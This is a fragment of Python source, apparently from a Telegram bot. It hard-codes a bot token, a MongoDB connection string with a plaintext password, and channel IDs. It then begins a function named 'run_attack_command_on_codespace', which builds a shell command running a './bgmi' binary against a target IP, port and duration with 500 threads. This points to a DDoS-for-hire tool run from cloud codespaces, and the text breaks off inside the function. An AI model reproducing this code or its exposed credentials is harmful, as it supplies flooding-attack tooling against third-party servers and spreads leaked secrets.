...
TOKEN = '7594583741:AAHBZ-J2uoMVluvg3pYTgEGTcbNCrbauteQ'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002405877722
CHANNEL_ID = -1002405877722
error_channel_id = -1002405877722
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} {500}"
    try:
